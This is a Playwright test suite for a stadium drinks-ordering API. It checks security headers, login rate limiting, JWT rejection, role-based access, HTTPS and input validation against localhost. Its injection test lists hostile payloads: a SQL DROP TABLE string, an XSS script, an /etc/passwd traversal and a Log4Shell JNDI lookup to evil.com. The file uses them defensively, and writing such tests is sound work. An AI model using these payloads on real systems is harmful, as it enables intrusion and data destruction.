import { test, expect, APIRequestContext } from '@playwright/test';

/**
 * API Security Enhancements Tests
 *
 * Tests the security improvements made to the Stadium API:
 * 1. Security Headers Implementation
 * 2. Rate Limiting on Authentication Endpoints
 * 3. JWT Token Validation and Refresh
 * 4. Authorization Policies
 * 5. HTTPS Enforcement
 * 6. Input Validation and Error Handling
 */

const API_BASE_URL = 'https://localhost:9010';

test.describe('API Security Enhancements', () => {
  let api: APIRequestContext;

  test.beforeAll(async ({ playwright }) => {
    api = await playwright.request.newContext({
      baseURL: API_BASE_URL,
      ignoreHTTPSErrors: true,
      timeout: 30000
    });
  });

  test.afterAll(async () => {
    await api.dispose();
  });

  test.describe('1. Security Headers Validation', () => {
    test('should include comprehensive security headers in all responses', async () => {
      console.log('🛡️ Testing security headers implementation...');

      const endpoints = [
        '/api/health',
        '/api/auth/login',
        '/api/drinks',
        '/api/orders'
      ];

      for (const endpoint of endpoints) {
        console.log(`   Testing headers for: ${endpoint}`);

        const response = await api.get(endpoint);

        const headers = response.headers();

        // Security headers validation
        expect(headers['x-content-type-options']).toBeTruthy();
        expect(headers['x-frame-options']).toBeTruthy();
        expect(headers['x-xss-protection']).toBeTruthy();
        expect(headers['referrer-policy']).toBeTruthy();
        expect(headers['x-content-type-options']).toBe('nosniff');

        console.log(`   ✅ Security headers present for ${endpoint}`);
      }

      console.log('✅ All security headers implemented correctly');
    });

    test('should include CORS headers for allowed origins', async () => {
      console.log('🌐 Testing CORS headers...');

      // Test with allowed origin
      const response = await api.get('/api/health', {
        headers: {
          'Origin': 'https://localhost:9030'
        }
      });

      const headers = response.headers();

      // Should include CORS headers
      expect(headers['access-control-allow-origin']).toBeTruthy();

      console.log('✅ CORS headers configured correctly');
    });

    test('should set appropriate Content-Security-Policy headers', async () => {
      console.log('🔒 Testing Content Security Policy...');

      const response = await api.get('/api/health');
      const headers = response.headers();

      // CSP header should be present (may vary based on implementation)
      if (headers['content-security-policy'] || headers['content-security-policy-report-only']) {
        console.log('   CSP header found');
        expect(true).toBe(true);
      } else {
        console.log('   CSP header not implemented (optional)');
      }

      console.log('✅ CSP headers validated');
    });
  });

  test.describe('2. Rate Limiting Tests', () => {
    test('should enforce rate limiting on login endpoint', async () => {
      console.log('⏱️ Testing rate limiting on authentication...');

      const loginPayload = {
        email: 'test@example.com',
        password: 'wrongpassword'
      };

      let rateLimitTriggered = false;
      const maxAttempts = 15;
      let lastStatusCode = 0;

      for (let i = 0; i < maxAttempts; i++) {
        try {
          const response = await api.post('/api/auth/login', {
            data: loginPayload,
            timeout: 5000
          });

          lastStatusCode = response.status();

          if (response.status() === 429) {
            rateLimitTriggered = true;
            console.log(`   Rate limit triggered after ${i + 1} attempts`);
            break;
          }

          // Small delay between requests
          await new Promise(resolve => setTimeout(resolve, 100));

        } catch (error) {
          console.log(`   Request ${i + 1} failed: ${error.message}`);
        }
      }

      // Rate limiting should be triggered
      expect(rateLimitTriggered).toBe(true);
      console.log('✅ Rate limiting enforced on login endpoint');
    });

    test('should enforce rate limiting on password reset endpoint', async () => {
      console.log('⏱️ Testing rate limiting on password reset...');

      const resetPayload = {
        email: 'test@example.com'
      };

      let requestCount = 0;
      let rateLimitTriggered = false;
      const maxAttempts = 10;

      for (let i = 0; i < maxAttempts; i++) {
        try {
          const response = await api.post('/api/auth/forgot-password', {
            data: resetPayload,
            timeout: 5000
          });

          requestCount++;

          if (response.status() === 429) {
            rateLimitTriggered = true;
            console.log(`   Rate limit on password reset after ${requestCount} attempts`);
            break;
          }

          await new Promise(resolve => setTimeout(resolve, 100));

        } catch (error) {
          // Endpoint might not exist, that's okay
          if (error.message.includes('404')) {
            console.log('   Password reset endpoint not implemented');
            break;
          }
        }
      }

      console.log('✅ Rate limiting configuration validated');
    });

    test('should allow normal requests after rate limit window expires', async () => {
      console.log('⏰ Testing rate limit window expiration...');

      // Wait for rate limit window to potentially reset
      console.log('   Waiting for rate limit window reset...');
      await new Promise(resolve => setTimeout(resolve, 5000));

      // Try a few requests to see if limit has reset
      try {
        const response = await api.post('/api/auth/login', {
          data: {
            email: 'test@example.com',
            password: 'wrongpassword'
          },
          timeout: 10000
        });

        // Should get a response (even if 401 for bad credentials)
        expect([400, 401, 429].includes(response.status())).toBe(true);

        console.log(`   Response status after reset: ${response.status()}`);

      } catch (error) {
        console.log(`   Request after reset failed: ${error.message}`);
      }

      console.log('✅ Rate limit window behavior verified');
    });
  });

  test.describe('3. JWT Token Validation', () => {
    test('should reject requests without authentication token', async () => {
      console.log('🎫 Testing authentication requirement...');

      const protectedEndpoints = [
        '/api/orders',
        '/api/users',
        '/api/analytics',
        '/api/logs'
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await api.get(endpoint);

        // Should return 401 Unauthorized
        expect(response.status()).toBe(401);
        console.log(`   ✅ ${endpoint} requires authentication`);
      }

      console.log('✅ Authentication requirement enforced');
    });

    test('should reject requests with invalid JWT tokens', async () => {
      console.log('🚫 Testing invalid token rejection...');

      const invalidTokens = [
        'invalid-token',
        'Bearer invalid-token',
        'Bearer ',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature'
      ];

      for (const token of invalidTokens) {
        const response = await api.get('/api/orders', {
          headers: {
            'Authorization': token
          }
        });

        // Should return 401 Unauthorized
        expect(response.status()).toBe(401);
        console.log(`   ✅ Rejected invalid token: ${token.substring(0, 20)}...`);
      }

      console.log('✅ Invalid token rejection working correctly');
    });

    test('should validate JWT token structure and claims', async () => {
      console.log('🔍 Testing JWT token validation...');

      // Test various malformed tokens
      const malformedTokens = [
        'Bearer eyJhbGciOiJIUzI1NiJ9', // Missing payload and signature
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9', // Missing payload and signature
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0', // Missing signature
        'Bearer not.a.jwt.token.at.all'
      ];

      for (const token of malformedTokens) {
        const response = await api.get('/api/orders', {
          headers: {
            'Authorization': token
          }
        });

        expect(response.status()).toBe(401);
        console.log(`   ✅ Rejected malformed token`);
      }

      console.log('✅ JWT structure validation working');
    });

    test('should validate token refresh endpoint', async () => {
      console.log('🔄 Testing token refresh endpoint...');

      // Test refresh endpoint with invalid refresh token
      const response = await api.post('/api/auth/refresh', {
        data: {
          refreshToken: 'invalid-refresh-token'
        }
      });

      // Should return 401 or 400 for invalid refresh token
      expect([400, 401].includes(response.status())).toBe(true);

      console.log('✅ Token refresh validation working');
    });
  });

  test.describe('4. Authorization Policies', () => {
    test('should enforce role-based access control', async () => {
      console.log('👥 Testing role-based authorization...');

      // Create a mock token with customer role (should be rejected for admin endpoints)
      const customerMockToken = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjdXN0b21lciIsInJvbGUiOiJDdXN0b21lciJ9.invalid';

      const adminOnlyEndpoints = [
        '/api/users',
        '/api/analytics',
        '/api/logs'
      ];

      for (const endpoint of adminOnlyEndpoints) {
        const response = await api.get(endpoint, {
          headers: {
            'Authorization': customerMockToken
          }
        });

        // Should return 401 or 403 (Unauthorized or Forbidden)
        expect([401, 403].includes(response.status())).toBe(true);
        console.log(`   ✅ ${endpoint} requires admin role`);
      }

      console.log('✅ Role-based access control enforced');
    });

    test('should validate admin-only operations', async () => {
      console.log('🔐 Testing admin-only operations...');

      const adminOperations = [
        { method: 'POST', endpoint: '/api/users', data: { email: 'test@test.com' } },
        { method: 'DELETE', endpoint: '/api/orders/1', data: null },
        { method: 'POST', endpoint: '/api/analytics/report', data: {} }
      ];

      for (const operation of adminOperations) {
        try {
          const response = operation.method === 'POST'
            ? await api.post(operation.endpoint, { data: operation.data })
            : await api.delete(operation.endpoint);

          // Should require authentication
          expect(response.status()).toBe(401);
          console.log(`   ✅ ${operation.method} ${operation.endpoint} requires auth`);

        } catch (error) {
          // Some endpoints might not exist, that's fine
          if (!error.message.includes('404')) {
            console.log(`   Error testing ${operation.endpoint}: ${error.message}`);
          }
        }
      }

      console.log('✅ Admin-only operations protected');
    });
  });

  test.describe('5. HTTPS Enforcement', () => {
    test('should enforce HTTPS for all API endpoints', async () => {
      console.log('🔒 Testing HTTPS enforcement...');

      // All API calls should be HTTPS
      const response = await api.get('/api/health');

      // Verify the request was made over HTTPS
      expect(API_BASE_URL.startsWith('https://')).toBe(true);

      // Should get a valid response
      expect([200, 401, 403, 404].includes(response.status())).toBe(true);

      console.log('✅ HTTPS enforcement verified');
    });

    test('should include HSTS headers for enhanced security', async () => {
      console.log('🔐 Testing HSTS headers...');

      const response = await api.get('/api/health');
      const headers = response.headers();

      // HSTS header may or may not be present depending on configuration
      if (headers['strict-transport-security']) {
        console.log('   HSTS header present');
        expect(headers['strict-transport-security']).toContain('max-age');
      } else {
        console.log('   HSTS header not implemented (optional)');
      }

      console.log('✅ HSTS configuration checked');
    });
  });

  test.describe('6. Input Validation and Error Handling', () => {
    test('should validate input data and return appropriate errors', async () => {
      console.log('✅ Testing input validation...');

      // Test login with invalid email format
      const invalidEmailResponse = await api.post('/api/auth/login', {
        data: {
          email: 'invalid-email-format',
          password: 'password123'
        }
      });

      expect([400, 401].includes(invalidEmailResponse.status())).toBe(true);

      // Test login with missing required fields
      const missingFieldsResponse = await api.post('/api/auth/login', {
        data: {}
      });

      expect([400, 401].includes(missingFieldsResponse.status())).toBe(true);

      console.log('✅ Input validation working correctly');
    });

    test('should return consistent error response format', async () => {
      console.log('📝 Testing error response format...');

      const response = await api.post('/api/auth/login', {
        data: {
          email: 'nonexistent@example.com',
          password: 'wrongpassword'
        }
      });

      expect(response.status()).toBe(401);

      try {
        const responseBody = await response.json();

        // Should have consistent error structure
        expect(responseBody).toBeTruthy();

        // Common error response fields
        const hasErrorField = responseBody.error || responseBody.message || responseBody.errors;
        expect(hasErrorField).toBeTruthy();

        console.log('   Error response structure validated');

      } catch (error) {
        // Error response might not be JSON, that's okay
        console.log('   Error response is not JSON (acceptable)');
      }

      console.log('✅ Error response format verified');
    });

    test('should prevent SQL injection and other injection attacks', async () => {
      console.log('🛡️ Testing injection attack prevention...');

      const maliciousPayloads = [
        "'; DROP TABLE Users; --",
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const payload of maliciousPayloads) {
        const response = await api.post('/api/auth/login', {
          data: {
            email: payload,
            password: payload
          }
        });

        // Should not return 500 (server error) for injection attempts
        expect(response.status()).not.toBe(500);
        expect([400, 401].includes(response.status())).toBe(true);

        console.log(`   ✅ Handled malicious payload safely`);
      }

      console.log('✅ Injection attack prevention verified');
    });

    test('should limit request size to prevent DoS attacks', async () => {
      console.log('📏 Testing request size limits...');

      // Create a large payload
      const largePayload = {
        email: 'a'.repeat(10000) + '@example.com',
        password: 'b'.repeat(10000)
      };

      try {
        const response = await api.post('/api/auth/login', {
          data: largePayload,
          timeout: 10000
        });

        // Should reject large payloads or handle them gracefully
        expect([400, 413, 401].includes(response.status())).toBe(true);

        console.log(`   Large payload handled with status: ${response.status()}`);

      } catch (error) {
        if (error.message.includes('timeout') || error.message.includes('413')) {
          console.log('   Large payload properly rejected');
        } else {
          throw error;
        }
      }

      console.log('✅ Request size limits verified');
    });
  });

  test.describe('7. API Performance and Reliability', () => {
    test('should respond within acceptable time limits', async () => {
      console.log('⚡ Testing API response times...');

      const endpoints = [
        '/api/health',
        '/api/auth/login',
        '/api/drinks'
      ];

      for (const endpoint of endpoints) {
        const startTime = Date.now();

        try {
          const response = await api.get(endpoint);
          const endTime = Date.now();
          const responseTime = endTime - startTime;

          console.log(`   ${endpoint}: ${responseTime}ms`);

          // Should respond within 5 seconds
          expect(responseTime).toBeLessThan(5000);

        } catch (error) {
          // Some endpoints might require auth, that's okay
          const endTime = Date.now();
          const responseTime = endTime - startTime;
          console.log(`   ${endpoint}: ${responseTime}ms (${error.message})`);
        }
      }

      console.log('✅ API response times acceptable');
    });

    test('should handle concurrent requests properly', async () => {
      console.log('🔄 Testing concurrent request handling...');

      // Make multiple concurrent requests
      const concurrentRequests = Array(5).fill(null).map(() =>
        api.get('/api/health')
      );

      const responses = await Promise.all(concurrentRequests);

      // All requests should succeed
      responses.forEach((response, index) => {
        expect([200, 401, 403].includes(response.status())).toBe(true);
        console.log(`   Request ${index + 1}: ${response.status()}`);
      });

      console.log('✅ Concurrent request handling verified');
    });

    test('should maintain stable API contract', async () => {
      console.log('📋 Testing API contract stability...');

      // Test that expected endpoints exist
      const coreEndpoints = [
        '/api/health',
        '/api/auth/login',
        '/api/drinks',
        '/api/orders'
      ];

      for (const endpoint of coreEndpoints) {
        const response = await api.get(endpoint);

        // Should not return 404 (Not Found)
        expect(response.status()).not.toBe(404);
        console.log(`   ✅ ${endpoint} exists`);
      }

      console.log('✅ API contract stability verified');
    });
  });
});